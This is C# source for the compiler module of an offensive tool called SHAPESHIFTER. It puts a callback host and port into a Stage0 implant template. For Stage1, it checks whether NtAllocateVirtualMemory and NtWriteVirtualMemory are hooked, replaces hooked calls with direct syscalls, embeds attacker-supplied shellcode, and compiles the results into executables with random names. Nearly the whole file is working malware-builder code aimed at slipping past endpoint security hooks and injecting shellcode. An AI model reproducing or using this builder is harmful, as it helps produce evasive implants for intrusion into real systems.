using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;

namespace SHAPESHIFTER
{
    class Compiler
    {
        public static bool CompileStage0(string host, int port)
        {
            string sourcePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            string sourceFile = Path.Combine(sourcePath, @"Templates\Stage0Template.cs");

            if (!File.Exists(sourceFile))
            {
                Console.WriteLine("[-] Can't find the Stage0 template file. Is the \"Tempates\" " +
                    "directory in the same directory as SHAPESHIFTER.exe?");
                return false;
            }

            // Replace placeholders with information for the callback
            string template = File.ReadAllText(sourceFile);
            string modified = template.Replace(@"[SHAPESHIFTER_HOST]", host);
            modified = modified.Replace(@"[SHAPESHIFTER_PORT]", port.ToString());
            File.WriteAllText(sourceFile, modified);

            CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
            CompilerParameters cParams = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = Path.Combine(sourcePath, "stage0.exe"),
                IncludeDebugInformation = false,
                GenerateInMemory = false,
                WarningLevel = 0, // No warnings means no bugs, right?
                TreatWarningsAsErrors = false,
                CompilerOptions = "/unsafe",
                TempFiles = new TempFileCollection(".", false),
                MainClass = "Stage0.Program"                
            };
            cParams.ReferencedAssemblies.Add("System.dll");
            cParams.ReferencedAssemblies.Add("System.Core.dll");
            cParams.ReferencedAssemblies.Add("System.Data.dll");
            cParams.ReferencedAssemblies.Add("System.Data.DatasetExtensions.dll");
            cParams.ReferencedAssemblies.Add("System.Net.dll");
            cParams.ReferencedAssemblies.Add("System.Xml.dll");
            cParams.ReferencedAssemblies.Add("System.Xml.Linq.dll");

            CompilerResults results = provider.CompileAssemblyFromFile(cParams, sourceFile);
            if (results.Errors.Count == 0)
            {
                Console.WriteLine("[+] Stage0 compiled into {0}", results.PathToAssembly);
            }
            else
            {
                Console.WriteLine("[-] Error during Stage0 compilation");
                foreach (CompilerError e in results.Errors)
                {
                    Console.WriteLine("    {0}", e.ToString());
                }
                return false;
            }
            return true;
        }

        public static bool BuildStage1(IList<string> hookedFunctions, string shellcodeFile, string clientId)
        {
            string sourcePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            string sourceFile = Path.Combine(sourcePath, @"Templates\Stage1Template.cs");

            if (!File.Exists(sourceFile))
            {
                Console.WriteLine("[-] Can't find the Stage1 template file. Is the \"Tempates\" " +
                    "directory in the same directory as SHAPESHIFTER.exe?");
                return false;
            }

            string template = File.ReadAllText(sourceFile);
            StringBuilder modified = new StringBuilder(template);

            Console.WriteLine("  [>] Generating Stage1 source files for compilation...");
            try
            {
                StringBuilder pinvokes = new StringBuilder();
                StringBuilder syscalls = new StringBuilder();
                StringBuilder delegates = new StringBuilder();
                StringBuilder memalloc = new StringBuilder();
                StringBuilder writevm = new StringBuilder();

                // Check if NtAllocateVirtualMemory is hooked
                if (hookedFunctions.Contains("NtAllocateVirtualMemory"))
                {
                    syscalls.AppendLine(Callees.method_NtAllocateVirtualMemory);
                    delegates.AppendLine(Callees.delegate_NtAllocateVirtualMemory);
                    memalloc.AppendLine(Callees.call_NtAllocateVirtualMemory);

                }
                else
                {
                    pinvokes.Append(Callees.pinvoke_VirtualAllocEx);
                    memalloc.AppendLine(Callees.call_VirtualAllocEx);
                }

                // Check if NtWriteVirtualMemory is hooked
                if (hookedFunctions.Contains("NtWriteVirtualMemory"))
                {
                    syscalls.AppendLine(Callees.method_NtWriteVirtualMemory);
                    delegates.AppendLine(Callees.delegate_NtWriteVirtualMemory);
                    writevm.AppendLine(Callees.call_NtWriteVirtualMemory);

                }
                else
                {
                    pinvokes.Append(Callees.pinvoke_WriteVirtualMemory);
                    writevm.AppendLine(Callees.call_WriteVirtualMemory);
                }


                modified.Replace("[SHAPESHIFTER_PINVOKES]", pinvokes.ToString());
                modified.Replace("[SHAPESHIFTER_SYSCALLS]", syscalls.ToString());
                modified.Replace("[SHAPESHIFTER_DELEGATES]", delegates.ToString());
                modified.Replace("[SHAPESHIFTER_MEMALLOC]", memalloc.ToString());
                modified.Replace("[SHAPESHIFTER_WRITEVM]", writevm.ToString());


                try
                {
                    string shellcodeString = Helpers.ByteArrayToFormattedString(File.ReadAllBytes(shellcodeFile));
                    modified.Replace("[SHAPESHIFTER_SHELLCODE]", shellcodeString);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Error while converting and replacing shellcode in the template");
                    return false;
                }


                string newStage1File = sourcePath + @"\BuiltStages\" + clientId + ".cs";
                using (StreamWriter writer = new StreamWriter(newStage1File, false))
                {
                    writer.Write(modified.ToString());
                    writer.Close();
                }

                Console.WriteLine("  [+] Source file created!");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error while creating Stage1 source file ({0})", ex.Message);
                return false;
            }
        }

        public static bool CompileStage1(string clientId)
        {
            string sourcePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            string sourceFile = sourcePath + @"\BuiltStages\" + clientId + ".cs";

            if (!File.Exists(sourceFile))
            {
                Console.WriteLine("  [-] Can't find the generated Stage1 source file. Make sure that {0} exists", sourceFile);
                return false;
            }

            string outputFileName = Helpers.GenerateRandomFileName();
            CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
            CompilerParameters cParams = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = sourcePath + @"\BuiltStages\" + outputFileName,
                IncludeDebugInformation = false,
                GenerateInMemory = false,
                WarningLevel = 0, // No warnings means no bugs, right?
                TreatWarningsAsErrors = false,
                CompilerOptions = " /unsafe",
                TempFiles = new TempFileCollection(".", false),
                MainClass = "Stage1.Program"
            };
            cParams.ReferencedAssemblies.Add("System.dll");
            cParams.ReferencedAssemblies.Add("System.Core.dll");
            cParams.ReferencedAssemblies.Add("System.Data.dll");
            cParams.ReferencedAssemblies.Add("System.Net.dll");
            cParams.ReferencedAssemblies.Add("System.Xml.dll");
            cParams.ReferencedAssemblies.Add("System.Xml.Linq.dll");

            CompilerResults results = provider.CompileAssemblyFromFile(cParams, sourceFile);
            if (results.Errors.Count == 0)
            {
                Console.WriteLine("  [+] Stage1 compiled into {0}", outputFileName);
            }
            else
            {
                Console.WriteLine("  [-] Error during Stage1 compilation");
                foreach (CompilerError e in results.Errors)
                {
                    Console.WriteLine("    {0}", e.ToString());
                }
                return false;
            }
            return true;
        }
    }
}
